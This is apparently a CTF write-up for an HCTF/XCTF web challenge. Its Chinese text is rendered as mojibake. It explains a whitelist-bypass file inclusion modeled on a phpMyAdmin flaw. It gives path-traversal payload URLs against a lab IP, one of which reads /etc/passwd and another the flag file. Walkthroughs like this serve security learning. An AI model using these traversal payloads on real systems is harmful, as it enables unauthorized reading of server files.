HCTFï¼Œæ‰“å¼€é“¾æ¥ï¼ˆæ»‘ç¨½.jpgï¼‰ğŸ§<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923174.png" alt="1602763719432.png"></p><p>å°†å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°æ²¡æœ‰å‘ç°çº¿ç´¢ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°äº†æç¤ºï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923200.png" alt="1602763786996.png"></p><p>å­˜åœ¨source.phpï¼Œäºæ˜¯åœ°å€åè¾¹è·Ÿsource.phpï¼ŒæˆåŠŸè¾“å‡ºæºç <br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923210.png" alt="1602763852951.png"></p><p><strong>ä¿å­˜è‡³æœ¬åœ°ï¼Œè¿›è¡Œä»£ç å®¡è®¡</strong></p><p>ä½†æ˜¯å®¡è®¡æ—¶å‘ç°ï¼Œè¯¶ï¼Œæ€ä¹ˆæœ‰ç‚¹ç†Ÿæ‚‰ï¼Œå¥½åƒä¹‹å‰å¤ç°äº†ä¸€ä¸ªphpmyadminä»»æ„æ–‡ä»¶åŒ…å«çš„æ¼æ´ï¼Œè·Ÿè¿™ä¸ªé¢˜ç›®çš„æºç é€»è¾‘ä¸€æ¨¡ä¸€æ ·ï¼Œå¤ªæ£’äº†ï¼</p><p>å…·ä½“çš„å®¡è®¡è¿‡ç¨‹å¯ä»¥å‚è€ƒä¹‹å‰çš„phpmyadminæ¼æ´å¤ç°ï¼ŒåŸç†ä¸€æ¨¡ä¸€æ ·ï¼</p><p>è¿™é‡Œå¤§è‡´è¯´ä¸€ä¸‹æ¼æ´ï¼š</p><ul><li>ç¨‹åºè®¾å®šæ–‡ä»¶ç™½åå•ï¼Œå¹¶åˆ©ç”¨ï¼Ÿåˆ†å‰²åçš„ç¬¬ä¸€ä¸ªæ•°æ®æ¥åšç™½åå•æ ¡éªŒï¼Œè¿˜åŠ å…¥äº†urldecodeï¼Œå› æ­¤å¯ä»¥äºŒæ¬¡ä¼ é€’è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</li></ul><p>OKå›åˆ°é¢˜ç›®ï¼Œç»è¿‡å¯¹source.phpå®¡è®¡å‘ç°ï¼Œè¿˜æœ‰ä¸€ä¸ªhint.phpï¼Œå› ä¸ºæ˜¯ç™½åå•å†…æ‰€ä»¥æ­£å¸¸åŒ…å«è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°ä»¥ä¸‹å…³äºflagçš„çº¿ç´¢ï¼šå­˜åœ¨äº ffffllllaaaagggg æ–‡ä»¶å†…<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923287.png" alt="1602764402114.png"></p><p>åœ¨å½“å‰ç›®å½•åŒ…å«å¤±è´¥åï¼Œè€ƒè™‘å¯èƒ½å­˜åœ¨äºæ ¹ç›®å½•ï¼Œäºæ˜¯ä¸æ–­å°è¯•åˆ©ç”¨passwdæ–‡ä»¶æ‰¾åˆ°æ ¹ç›®å½•</p><p>payloadï¼š</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:54486?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></code></pre><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923309.png" alt="1602764669041.png"></p><p>æ ¹ç›®å½•åŒ…å«flagæ–‡ä»¶ï¼Œå¾—åˆ°flag</p><p>payloadï¼š<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.133:54486?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923324.png" alt="1602764846675.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
